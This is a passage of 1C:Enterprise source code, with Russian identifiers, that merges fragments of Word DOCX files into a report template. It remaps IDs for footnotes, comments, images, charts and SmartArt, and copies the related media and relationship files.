			ДобавитьТипСодержимого(Контекст.ДанныеШаблона.ТипыСодержимого, ""<Override PartName=""""/word/numbering.xml"""" ContentType=""""application/vnd.openxmlformats-officedocument.wordprocessingml.numbering+xml""""/>"");
			ДобавитьСвязьДокумента(Контекст.ДанныеШаблона.СвязиДокумента, ""numbering"", ""numbering.xml"", ""rId901"");
		КонецЕсли;
	КонецЕсли;
КонецПроцедуры

// Обработка сносок фрагмента. Выполняется перегенерация идентификаторов и замена ссылок 
// на них в содержимом файла сносок отчета и в содержимом текста фрагмента.
// 
// Параметры:
//  Контекст - структура - содержащая определения сносок отчета
//  ДанныеФрагмента - структура - in, данные фрагмента
//  КонцевыеСноски - булево - in, если истина, то обрабатываются концевые сноски, иначе обычные сноски
//
Процедура ОбработкаСносокФрагмента(Контекст, ДанныеФрагмента, КонцевыеСноски = Ложь)
	Если КонцевыеСноски Тогда
		ИмяВСтруктуре = ""КонцевыеСноски"";
		ИмяТега = ""endnote"";
		ИмяСхем = ""XMLСхемыКонцевыхСносок"";
		ИДСвязи = ""rId903"";
	Иначе
		ИмяВСтруктуре = ""Сноски"";
		ИмяТега = ""footnote"";
		ИмяСхем = ""XMLСхемыСносок"";
		ИДСвязи = ""rId902"";
	КонецЕсли;
	
	// если у фрагмента нет сносок, то делать ничего не нужно
	Если ЗначениеЗаполнено(ДанныеФрагмента[ИмяВСтруктуре]) Тогда
		// копируем определение сносок фрагмента в сноски шаблона
		Если ЗначениеЗаполнено(Контекст.ДанныеШаблона[ИмяВСтруктуре]) Тогда
			ОбработкаXMLСхемФрагмента(ДанныеФрагмента[ИмяВСтруктуре], Контекст[ИмяСхем], ИмяТега + ""s"");
			// считываем определение сносок фрагмента
			СноскиФрагмента = Новый Структура(""ДанныеШаблона, "" + ИмяВСтруктуре, Новый Структура(ИмяВСтруктуре, ДанныеФрагмента[ИмяВСтруктуре]));
			СчитатьОпределениеСносок(СноскиФрагмента, КонцевыеСноски);
			
			ТегСсылки = ""<w:"" + ИмяТега + ""Reference "";
			Текст = ДанныеФрагмента.ТекстШаблона;
			ДанныеФрагмента.ТекстШаблона = """";
			Начало = Найти(Текст, ТегСсылки);
			Пока Начало > 0 Цикл
				Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Текст, ""/>"", Начало) + 2;
				ИД = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Текст, ""w:id="""""", Начало, Конец);
				ТекстСноски = СноскиФрагмента[ИмяВСтруктуре][ИД];
				СтрокаИДСноски = ""w:id="""""" + ИД + """""""";
				НовыйИД = Строка(Новый УникальныйИдентификатор);
				НачалоИД = Найти(ТекстСноски, СтрокаИДСноски);
				ТекстСноски = Лев(ТекстСноски, НачалоИД + 5) + НовыйИД + Сред(ТекстСноски, НачалоИД + СтрДлина(СтрокаИДСноски) - 1);
				Контекст[ИмяВСтруктуре].Вставить(НовыйИД, ТекстСноски);
				ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Лев(Текст, Начало - 1) + ТегСсылки + ""w:id="""""" + НовыйИД + """"""/>"";
				Текст = Сред(Текст, Конец);
				Начало = Найти(Текст, ТегСсылки);
			КонецЦикла;
			ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Текст;
		Иначе
			// если в исходном файле сноски не были определены, то копируем определение сносок из фрагмента и считываем их
			Контекст.ДанныеШаблона[ИмяВСтруктуре] = ДанныеФрагмента[ИмяВСтруктуре];
			ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона[ИмяВСтруктуре], Контекст[ИмяСхем], ИмяТега + ""s"");
			СчитатьОпределениеСносок(Контекст, КонцевыеСноски);
			ДобавитьТипСодержимого(Контекст.ДанныеШаблона.ТипыСодержимого, ""<Override PartName=""""/word/"" + ИмяТега + ""s.xml"""" ContentType=""""application/vnd.openxmlformats-officedocument.wordprocessingml."" + ИмяТега + ""s+xml""""/>"");
			ДобавитьСвязьДокумента(Контекст.ДанныеШаблона.СвязиДокумента, ИмяТега + ""s"", ИмяТега + ""s.xml"", ИДСвязи);
		КонецЕсли;
	КонецЕсли;
КонецПроцедуры

// Обработка примечаний фрагмента. Выполняется перегенерация идентификаторов и замена ссылок 
// на них в содержимом файла примечаний отчета и в содержимом текста фрагмента.
// 
// Параметры:
//  Контекст - структура - содержащая определения примечаний отчета
//  ДанныеФрагмента - структура - in, данные фрагмента
//
Процедура ОбработкаПримечанийФрагмента(Контекст, ДанныеФрагмента)
	// если у фрагмента нет примечаний, то делать ничего не нужно
	Если ЗначениеЗаполнено(ДанныеФрагмента.Примечания) Тогда
		// копируем определение примечаний фрагмента в примечания шаблона
		Если ЗначениеЗаполнено(Контекст.ДанныеШаблона.Примечания) Тогда
			ОбработкаXMLСхемФрагмента(ДанныеФрагмента.Примечания, Контекст.XMLСхемыПримечаний, ""comments"");
			// считываем определение примечаний фрагмента
			ПримечанияФрагмента = Новый Структура(""ДанныеШаблона, Примечания"", Новый Структура(""Примечания"", ДанныеФрагмента.Примечания));
			СчитатьОпределениеПримечаний(ПримечанияФрагмента);
			
			Текст = ДанныеФрагмента.ТекстШаблона;
			ДанныеФрагмента.ТекстШаблона = """";
			Начало = Найти(Текст, ""<w:commentReference "");
			Пока Начало > 0 Цикл
				Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Текст, ""/>"", Начало) + 2;
				ИД = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Текст, ""w:id="""""", Начало, Конец);
				ТекстПримечания = ПримечанияФрагмента.Примечания[ИД];
				СтрокаИД = ""w:id="""""" + ИД + """""""";
				НовыйИД = Строка(Новый УникальныйИдентификатор);
				НачалоИД = Найти(ТекстПримечания, СтрокаИД);
				ТекстПримечания = Лев(ТекстПримечания, НачалоИД + 5) + НовыйИД + Сред(ТекстПримечания, НачалоИД + СтрДлина(СтрокаИД) - 1);
				Контекст.Примечания.Вставить(НовыйИД, ТекстПримечания);
				ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Лев(Текст, Начало - 1) + ""<w:commentReference w:id="""""" + НовыйИД + """"""/>"";
				ИзменитьИДГраницПримечания(ДанныеФрагмента.ТекстШаблона, ИД, НовыйИД);
				Текст = Сред(Текст, Конец);
				Начало = Найти(Текст, ""<w:commentReference "");
			КонецЦикла;
			ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Текст;
		Иначе
			// если в исходном файле примечания не были определены, то копируем определение примечаний из фрагмента и считываем их
			Контекст.ДанныеШаблона.Примечания = ДанныеФрагмента.Примечания;
			ВырезатьОпределениеXMLСхем(Контекст.ДанныеШаблона.Примечания, Контекст.XMLСхемыПримечаний, ""comments"");
			СчитатьОпределениеПримечаний(Контекст);
			ДобавитьТипСодержимого(Контекст.ДанныеШаблона.ТипыСодержимого, ""<Override PartName=""""/word/comments.xml"""" ContentType=""""application/vnd.openxmlformats-officedocument.wordprocessingml.comments+xml""""/>"");
			ДобавитьСвязьДокумента(Контекст.ДанныеШаблона.СвязиДокумента, ""comments"", ""comments.xml"", ""rId904"");
		КонецЕсли;
	КонецЕсли;
КонецПроцедуры

// Выполняет добавление необходимого типа содержимого в соответствующий файл шаблона
// 
// Параметры:
//  ТипыСодержимого - строка, содержащая содержимое файла [ContentTypes].xml шаблона
//  ОпределениеТипа - строка, содержащая определение типа, которое необходимо добавить к шаблону
//
Процедура ДобавитьТипСодержимого(ТипыСодержимого, ОпределениеТипа)
	// если тип еще не определен для шаблона, то дописываем его в конец файла
	Если Найти(ТипыСодержимого, ОпределениеТипа) = 0 Тогда
		ТипыСодержимого = СтрЗаменить(ТипыСодержимого, ""</Types>"", ОпределениеТипа + ""</Types>"");
	КонецЕсли;
КонецПроцедуры

// Выполняет добавление необходимого в соответствующий файл шаблона
// 
// Параметры:
//  СвязиДокумента - строка, содержащая содержимое файла document.xml.rels шаблона
//  ИмяСвязи - строка, содержащая наименование связи
//  ИмяФайлаСвязи - строка, содержащая наименование файла связи
//  ИДСвязи - строка, содержащая идентификатор связи, с которым ее необходимо добавить
//
Процедура ДобавитьСвязьДокумента(СвязиДокумента, ИмяСвязи, ИмяФайлаСвязи, ИДСвязи)
	ОпределениеСвязи = ""Type=""""http://schemas.openxmlformats.org/officeDocument/2006/relationships/"" + ИмяСвязи + """""" Target="""""" + ИмяФайлаСвязи + """""""";
	Если Найти(СвязиДокумента, ОпределениеСвязи) = 0 Тогда
		СвязиДокумента = СтрЗаменить(СвязиДокумента, ""</Relationships>"", ""<Relationship Id="""""" + ИДСвязи + """""" "" + ОпределениеСвязи + ""/></Relationships>"");
	КонецЕсли;
КонецПроцедуры

// Выполняет копирование необходимого типа рисунка из файла типов фрагмента в соответствующий файл шаблона 
// 
// Параметры:
//  ТипыСодержимогоШаблона - строка, содержащая содержимое файла [ContentTypes].xml шаблона
//  ТипыСодержимогоФрагмента - строка, содержащая содержимое файла [ContentTypes].xml фрагмента
//  РасширениеРисунка - строка, содержащая расширение файла рисунка
//
Процедура ДобавитьТипРисунка(ТипыСодержимогоШаблона, ТипыСодержимогоФрагмента, РасширениеРисунка)
	РасширениеРисунка = НРег(Сред(РасширениеРисунка, 2));
	ОпределениеТипа = Сред(ТипыСодержимогоФрагмента, Найти(ТипыСодержимогоФрагмента, ""<Default Extension="""""" + РасширениеРисунка + """"""""));
	ОпределениеТипа = Лев(ОпределениеТипа, Найти(ОпределениеТипа, ""/>"") + 1);
	ДобавитьТипСодержимого(ТипыСодержимогоШаблона, ОпределениеТипа);
КонецПроцедуры

// Обработка рисунков фрагмента. Выполняется копирование рисунков из папки media фрагмента в соответствующую папку шаблона, 
// а также перегенерацию идентификаторов и замену ссылок на них в содержимом текста фрагмента.
// 
// Параметры:
//  Контекст - структура - содержащая данные шаблона
//  ДанныеФрагмента - структура - in, данные фрагмента
//
Процедура ОбработкаОбъектовФрагмента(Контекст, ДанныеФрагмента)
	Начало = Найти(ДанныеФрагмента.ТекстШаблона, ""<w:drawing>"");
	Если Начало > 0 Тогда
		Текст = ДанныеФрагмента.ТекстШаблона;
		ДанныеФрагмента.ТекстШаблона = """";
		Пока Начало > 0 Цикл
			Начало = Начало + 10;
			ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Лев(Текст, Начало);
			Текст = Сред(Текст, Начало + 1);
			Начало = Найти(Текст, ""=""""http://schemas.openxmlformats.org/drawingml/2006/main"""""");
			Если Начало > 0 Тогда
				НачалоПсевдонима = ПостроительОтчетовКлиентСервер.НайтиСправа(Текст, "":"", Начало) + 1;
				ПсевдонимСхемы = Сред(Текст, НачалоПсевдонима, Начало - НачалоПсевдонима);
				// определяем тип объекта
				ТегТипаОбъекта = ""<"" + ПсевдонимСхемы + "":graphicData uri=""""http://schemas.openxmlformats.org/drawingml/2006/"";
				НачалоТипаОбъекта = Найти(Текст, ТегТипаОбъекта);
				Если НачалоТипаОбъекта > 0 Тогда
					НачалоТипаОбъекта = НачалоТипаОбъекта + СтрДлина(ТегТипаОбъекта);
					ТипОбъекта = Сред(Текст, НачалоТипаОбъекта, ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Текст, """""">"", НачалоТипаОбъекта) - НачалоТипаОбъекта);
					Если ТипОбъекта = ""picture"" Тогда
						ОбработатьРисунокФрагмента(Контекст, ДанныеФрагмента, Текст, ""<"" + ПсевдонимСхемы + "":blip r:embed="""""");
					ИначеЕсли ТипОбъекта = ""chart"" Тогда
						ОбработатьДиаграммуФрагмента(Контекст, ДанныеФрагмента, Текст);
					ИначеЕсли ТипОбъекта = ""diagram"" Тогда
						ОбработатьОбъектSmartArtФрагмента(Контекст, ДанныеФрагмента, Текст);
					КонецЕсли;
				КонецЕсли;
			КонецЕсли;
			Начало = Найти(Текст, ""<w:drawing>"");
		КонецЦикла;
		ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Текст;
	КонецЕсли;
	
	Начало = Найти(ДанныеФрагмента.ТекстШаблона, ""<w:pict>"");
	Если Начало > 0 Тогда
		ТегСсылкиНаРисунок = ""<v:imagedata r:id="""""";
		Текст = ДанныеФрагмента.ТекстШаблона;
		ДанныеФрагмента.ТекстШаблона = """";
		Пока Начало > 0 Цикл
			Начало = Начало + 7;
			ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Лев(Текст, Начало);
			Текст = Сред(Текст, Начало + 1);
			ОбработатьРисунокФрагмента(Контекст, ДанныеФрагмента, Текст, ТегСсылкиНаРисунок);
			Начало = Найти(Текст, ""<w:pict>"");
		КонецЦикла;
		ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Текст;
	КонецЕсли;
КонецПроцедуры

// Обработка рисунка фрагмента. Выполняется копирование рисунка из папки media фрагмента в соответствующую папку шаблона, 
// а также перегенерацию идентификаторов и замену ссылок на них в содержимом текста фрагмента.
// 
// Параметры:
//  Контекст - структура - содержащая данные шаблона
//  ДанныеФрагмента - структура - данные фрагмента
//  Текст - строка - текст фрагмента
//  ТегСсылкиНаРисунок - строка - тег определяющий рисунок (разный для рисунков определенных тегами pict или drawing)
//
Процедура ОбработатьРисунокФрагмента(Контекст, ДанныеФрагмента, Текст, ТегСсылкиНаРисунок)
	Начало = Найти(Текст, ТегСсылкиНаРисунок);
	Если Начало > 0 Тогда
		Начало = Начало + СтрДлина(ТегСсылкиНаРисунок);
		НовыйИД = ""rId"" + Формат(Контекст.ИндексВставленногоОбъекта, ""ЧГ="");
		ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Лев(Текст, Начало - 1) + НовыйИД;
		Текст = Сред(Текст, Начало);
		Начало = Найти(Текст, """""""");
		СтарыйИД = Лев(Текст, Начало - 1);
		Текст = Сред(Текст, Начало);
		
		ИмяФайла = ПолучитьИмяФайлаСодержимого(ДанныеФрагмента.СвязиДокумента, СтарыйИД);
		Если ЗначениеЗаполнено(ИмяФайла) Тогда
			Расширение = ПостроительОтчетовКлиентСервер.ПолучитьРасширениеФайла(ИмяФайла);
			НовоеИмяФайла = ""media/"" + НовыйИД + Расширение;
			СоздатьКаталог(ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\media""));
			КопироватьФайл(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеФрагмента.ИмяВременнойПапки + ""\word\"" + ИмяФайла),
						   ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\"" + НовоеИмяФайла));
			ДобавитьСвязьДокумента(Контекст.ДанныеШаблона.СвязиДокумента, ""image"", НовоеИмяФайла, НовыйИД);
			ДобавитьТипРисунка(Контекст.ДанныеШаблона.ТипыСодержимого, ДанныеФрагмента.ТипыСодержимого, Расширение);
		КонецЕсли;
		Контекст.ИндексВставленногоОбъекта = Контекст.ИндексВставленногоОбъекта + 1;
	КонецЕсли;
КонецПроцедуры

// Обработка диаграммы фрагмента. Выполняется копирование данных диаграммы из папок charts и embeddings фрагмента в соответствующую папку шаблона, 
// а также перегенерацию идентификаторов и замену ссылок на них в содержимом текста фрагмента.
// 
// Параметры:
//  Контекст - структура - содержащая данные шаблона
//  ДанныеФрагмента - структура - данные фрагмента
//  Текст - строка - текст фрагмента
//
Процедура ОбработатьДиаграммуФрагмента(Контекст, ДанныеФрагмента, Текст)
	ДобавитьТипСодержимого(Контекст.ДанныеШаблона.ТипыСодержимого, ""<Default Extension=""""xlsx"""" ContentType=""""application/vnd.openxmlformats-officedocument.spreadsheetml.sheet""""/>"");
	ТегДиаграммы = ""<c:chart xmlns:c=""""http://schemas.openxmlformats.org/drawingml/2006/chart"""" xmlns:r=""""http://schemas.openxmlformats.org/officeDocument/2006/relationships"""" r:id="""""";
	Начало = Найти(Текст, ТегДиаграммы);
	Если Начало > 0 Тогда
		Начало = Начало + СтрДлина(ТегДиаграммы);
		НовыйИД = ""rId"" + Формат(Контекст.ИндексВставленногоОбъекта, ""ЧГ="");
		ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Лев(Текст, Начало - 1) + НовыйИД;
		Текст = Сред(Текст, Начало);
		Начало = Найти(Текст, """""""");
		СтарыйИД = Лев(Текст, Начало - 1);
		Текст = Сред(Текст, Начало);
		
		ИмяФайла = ПолучитьИмяФайлаСодержимого(ДанныеФрагмента.СвязиДокумента, СтарыйИД);
		Если ЗначениеЗаполнено(ИмяФайла) Тогда
			Расширение = ПостроительОтчетовКлиентСервер.ПолучитьРасширениеФайла(ИмяФайла);
			НовоеИмяФайла = ""charts/"" + НовыйИД + Расширение;
			СоздатьКаталог(ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\charts""));
			КопироватьФайл(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеФрагмента.ИмяВременнойПапки + ""\word\"" + ИмяФайла),
						   ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\"" + НовоеИмяФайла));
			ДобавитьСвязьДокумента(Контекст.ДанныеШаблона.СвязиДокумента, ""chart"", НовоеИмяФайла, НовыйИД);
			ДобавитьТипСодержимого(Контекст.ДанныеШаблона.ТипыСодержимого, ""<Override PartName=""""/word/"" + НовоеИмяФайла + """""" ContentType=""""application/vnd.openxmlformats-officedocument.drawingml.chart+xml""""/>"");
			// копируем с изменением имен файлы связей диаграмм с данными
			ПутьКСвязямФрагмента = ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеФрагмента.ИмяВременнойПапки + ""\word\charts\_rels"");
			ПутьКСвязямОтчета = ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\charts\_rels"");
			СоздатьКаталог(ПутьКСвязямОтчета);
			ТекстФайлаСвязей = ПостроительОтчетовКлиентСервер.ПрочитатьТекстФайла(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ПутьКСвязямФрагмента + СтрЗаменить(ИмяФайла, ""charts"", """") + "".rels""));
			// копируем с изменением имен файлы данных
			НачалоИмени = Найти(ТекстФайлаСвязей, "" Target=""""../embeddings/"") + 23;
			Если НачалоИмени > 0 Тогда
				ИмяФайлаДанных = Сред(ТекстФайлаСвязей, НачалоИмени, ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ТекстФайлаСвязей, "".xlsx""""/>"", НачалоИмени) - НачалоИмени);
				ТекстФайлаСвязей = СтрЗаменить(ТекстФайлаСвязей, ИмяФайлаДанных, НовыйИД);
				СоздатьКаталог(ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\embeddings""));
				КопироватьФайл(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеФрагмента.ИмяВременнойПапки + ""\word\embeddings\"" + ИмяФайлаДанных + "".xlsx""),
							   ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\embeddings\"" + НовыйИД + "".xlsx""));
			КонецЕсли;
			// сохраняем файл связей
			ПостроительОтчетовКлиентСервер.ЗаписатьТекстФайла(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ПутьКСвязямОтчета + СтрЗаменить(НовоеИмяФайла, ""charts"", """") + "".rels""), ТекстФайлаСвязей);
		КонецЕсли;
		Контекст.ИндексВставленногоОбъекта = Контекст.ИндексВставленногоОбъекта + 1;
	КонецЕсли;
КонецПроцедуры
	
// Обработка объекта SmartArt фрагмента. Выполняется копирование данных объекта из папки diagrams фрагмента в соответствующую папку шаблона, 
// а также перегенерацию идентификаторов и замену ссылок на них в содержимом текста фрагмента.
// 
// Параметры:
//  Контекст - структура - содержащая данные шаблона
//  ДанныеФрагмента - структура - данные фрагмента
//  Текст - строка - текст фрагмента
//
Процедура ОбработатьОбъектSmartArtФрагмента(Контекст, ДанныеФрагмента, Текст)
	ТегДиаграммы = ""<dgm:relIds xmlns:dgm=""""http://schemas.openxmlformats.org/drawingml/2006/diagram"""" xmlns:r=""""http://schemas.openxmlformats.org/officeDocument/2006/relationships"""" "";
	Начало = Найти(Текст, ТегДиаграммы);
	Если Начало > 0 Тогда
		Начало = Начало + СтрДлина(ТегДиаграммы);
		Конец = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(Текст, ""/>"", Начало);
		Идентификаторы = Сред(Текст, Начало, Конец - Начало);
		СтарыеИД = Новый Структура;
		НовыеИД = Новый Структура;
		
		СтарыеИД.Вставить(""diagramData"", ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Идентификаторы, ""r:dm=""""""));
		НовыеИД.Вставить(""diagramData"", ""rId"" + Формат(Контекст.ИндексВставленногоОбъекта, ""ЧГ=""));
		Контекст.ИндексВставленногоОбъекта = Контекст.ИндексВставленногоОбъекта + 1;
		
		СтарыеИД.Вставить(""diagramLayout"", ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Идентификаторы, ""r:lo=""""""));
		НовыеИД.Вставить(""diagramLayout"", ""rId"" + Формат(Контекст.ИндексВставленногоОбъекта, ""ЧГ=""));
		Контекст.ИндексВставленногоОбъекта = Контекст.ИндексВставленногоОбъекта + 1;
		
		СтарыеИД.Вставить(""diagramQuickStyle"", ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Идентификаторы, ""r:qs=""""""));
		НовыеИД.Вставить(""diagramQuickStyle"", ""rId"" + Формат(Контекст.ИндексВставленногоОбъекта, ""ЧГ=""));
		Контекст.ИндексВставленногоОбъекта = Контекст.ИндексВставленногоОбъекта + 1;
		
		СтарыеИД.Вставить(""diagramColors"", ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(Идентификаторы, ""r:cs=""""""));
		НовыеИД.Вставить(""diagramColors"", ""rId"" + Формат(Контекст.ИндексВставленногоОбъекта, ""ЧГ=""));
		Контекст.ИндексВставленногоОбъекта = Контекст.ИндексВставленногоОбъекта + 1;
		
		ОбработанныеФайлы = Новый Соответствие;
		
		Для Каждого СтарыйИД Из СтарыеИД Цикл
			ИмяФайла = ПолучитьИмяФайлаСодержимого(ДанныеФрагмента.СвязиДокумента, СтарыйИД.Значение);
			Если ЗначениеЗаполнено(ИмяФайла) Тогда
				Расширение = ПостроительОтчетовКлиентСервер.ПолучитьРасширениеФайла(ИмяФайла);
				НовыйИД = НовыеИД[СтарыйИД.Ключ];
				ИмяКаталога = Лев(ИмяФайла, Найти(ИмяФайла, ""/"") - 1);
				НовоеИмяФайла = ИмяКаталога + ""/"" + НовыйИД + Расширение;
				ПутьКФайлу = ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\"" + НовоеИмяФайла);
				СоздатьКаталог(ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\"" + ИмяКаталога));
				КопироватьФайл(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеФрагмента.ИмяВременнойПапки + ""\word\"" + ИмяФайла), ПутьКФайлу);
				ДобавитьСвязьДокумента(Контекст.ДанныеШаблона.СвязиДокумента, СтарыйИД.Ключ, НовоеИмяФайла, НовыйИД);
				ДобавитьТипСодержимого(Контекст.ДанныеШаблона.ТипыСодержимого, ""<Override PartName=""""/word/"" + НовоеИмяФайла + """""" ContentType=""""application/vnd.openxmlformats-officedocument.drawingml."" + СтрЗаменить(СтарыйИД.Ключ, ""Quick"", """") + ""+xml""""/>"");
				
				Если СтарыйИД.Ключ = ""diagramData"" Тогда
					// копируем с изменением имен файлы связей объектов SmartArt с данными, если они есть
					СкопироватьМедиаФайлыДиаграмыФрагмента(ДанныеФрагмента, Контекст.ДанныеШаблона, ОбработанныеФайлы, ИмяФайла, НовоеИмяФайла);
					
					ТекстФайлаДанных = ПостроительОтчетовКлиентСервер.ПрочитатьТекстФайла(ПутьКФайлу);
					ТегРисунка = ""<dsp:dataModelExt xmlns:dsp=""""http://schemas.microsoft.com/office/drawing/2008/diagram"""" "";
					НачалоИД = Найти(ТекстФайлаДанных, ТегРисунка);
					Если НачалоИД > 0 Тогда
						НачалоИД = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ТекстФайлаДанных, "" relId="""""", НачалоИД + СтрДлина(ТегРисунка));
						Если НачалоИД > 0 Тогда
							НачалоИД = НачалоИД + 8;
							КонецИД = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ТекстФайлаДанных, """""""", НачалоИД);
							ИД = Сред(ТекстФайлаДанных, НачалоИД, КонецИД - НачалоИД);
							НовыйИД = ""rId"" + Формат(Контекст.ИндексВставленногоОбъекта, ""ЧГ="");
							ИмяФайла = ПолучитьИмяФайлаСодержимого(ДанныеФрагмента.СвязиДокумента, ИД);
							НовоеИмяФайла = ИмяКаталога + ""/"" + НовыйИД + "".xml"";
							КопироватьФайл(ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеФрагмента.ИмяВременнойПапки + ""\word\"" + ИмяФайла), 
										   ПостроительОтчетовКлиентСервер.НормализоватьПуть(Контекст.ДанныеШаблона.ИмяВременнойПапки + ""\word\"" + НовоеИмяФайла));
							ДобавитьСвязьДокумента(Контекст.ДанныеШаблона.СвязиДокумента, ""diagramDrawing"", НовоеИмяФайла, НовыйИД);
							ДобавитьТипСодержимого(Контекст.ДанныеШаблона.ТипыСодержимого, ""<Override PartName=""""/word/"" + НовоеИмяФайла + """""" ContentType=""""application/vnd.ms-office.drawingml.diagramDrawing+xml""""/>"");
							Контекст.ИндексВставленногоОбъекта = Контекст.ИндексВставленногоОбъекта + 1;
							ПостроительОтчетовКлиентСервер.ЗаписатьТекстФайла(ПутьКФайлу, Лев(ТекстФайлаДанных, НачалоИД - 1) + НовыйИД + Сред(ТекстФайлаДанных, КонецИД));
							
							// копируем с изменением имен файлы связей объектов SmartArt с данными, если они есть
							СкопироватьМедиаФайлыДиаграмыФрагмента(ДанныеФрагмента, Контекст.ДанныеШаблона, ОбработанныеФайлы, ИмяФайла, НовоеИмяФайла);
						КонецЕсли;
					КонецЕсли;
				КонецЕсли;
			КонецЕсли;
		КонецЦикла;
		
		ДанныеФрагмента.ТекстШаблона = ДанныеФрагмента.ТекстШаблона + Лев(Текст, Начало - 1) + ""r:dm="""""" + НовыеИД.diagramData + """""" r:lo="""""" + НовыеИД.diagramLayout + 
																							   """""" r:qs="""""" + НовыеИД.diagramQuickStyle + """""" r:cs="""""" + НовыеИД.diagramColors + """""""";
		Текст = Сред(Текст, Конец);
	КонецЕсли;
КонецПроцедуры

Процедура СкопироватьМедиаФайлыДиаграмыФрагмента(ДанныеФрагмента, ДанныеШаблона, ОбработанныеФайлы, ИмяФайла, НовоеИмяФайла)
	ПутьКСвязямФрагмента = ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеФрагмента.ИмяВременнойПапки + ""\word\diagrams\_rels"");
	ПутьКСвязямОтчета = ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеШаблона.ИмяВременнойПапки + ""\word\diagrams\_rels"");
	ПутьКМедиаПапкеФрагмента = ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеФрагмента.ИмяВременнойПапки + ""\word\media\"");
	ПутьКМедиаПапкеОтчета = ПостроительОтчетовКлиентСервер.НормализоватьПуть(ДанныеШаблона.ИмяВременнойПапки + ""\word\media\"");
	// копируем с изменением имен файлы связей объектов SmartArt с данными, если они есть
	ПутьКФайлуСвязей = ПостроительОтчетовКлиентСервер.НормализоватьПуть(ПутьКСвязямФрагмента + СтрЗаменить(ИмяФайла, ""diagrams"", """") + "".rels"");
	Если ПостроительОтчетовКлиентСервер.ЭтоПутьКФайлу(ПутьКФайлуСвязей) Тогда
		СоздатьКаталог(ПутьКСвязямОтчета);
		ТекстФайлаСвязей = ПостроительОтчетовКлиентСервер.ПрочитатьТекстФайла(ПутьКФайлуСвязей);
		ТекстФайлаСвязейРез = """";
		// копируем с изменением имен файлы картинок
		НачалоИмени = Найти(ТекстФайлаСвязей, "" Target=""""../media/"");
		Пока НачалоИмени > 0 Цикл
			НачалоИмени = НачалоИмени + 18;
			КонецИмени = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(ТекстФайлаСвязей, """"""/>"", НачалоИмени);
			ИмяМедиаФайла = Сред(ТекстФайлаСвязей, НачалоИмени, КонецИмени - НачалоИмени);
			НовоеИмяМедиаФайла = ОбработанныеФайлы.Получить(ИмяМедиаФайла);
			Если НовоеИмяМедиаФайла = Неопределено Тогда
				Расширение = ПостроительОтчетовКлиентСервер.ПолучитьРасширениеФайла(ИмяМедиаФайла);
				НовоеИмяМедиаФайла = СтрЗаменить(Новый УникальныйИдентификатор(), ""-"", """") + Расширение;
				СоздатьКаталог(ПутьКМедиаПапкеОтчета);
				КопироватьФайл(ПутьКМедиаПапкеФрагмента + ИмяМедиаФайла, ПутьКМедиаПапкеОтчета + НовоеИмяМедиаФайла);
				ОбработанныеФайлы.Вставить(ИмяМедиаФайла, НовоеИмяМедиаФайла);
				ДобавитьТипРисунка(ДанныеШаблона.ТипыСодержимого, ДанныеФрагмента.ТипыСодержимого, Расширение);
			КонецЕсли;
			ТекстФайлаСвязейРез = ТекстФайлаСвязейРез + Лев(ТекстФайлаСвязей, НачалоИмени - 1) + НовоеИмяМедиаФайла;
			ТекстФайлаСвязей = Сред(ТекстФайлаСвязей, КонецИмени);
			НачалоИмени = Найти(ТекстФайлаСвязей, "" Target=""""../media/"");
		КонецЦикла;
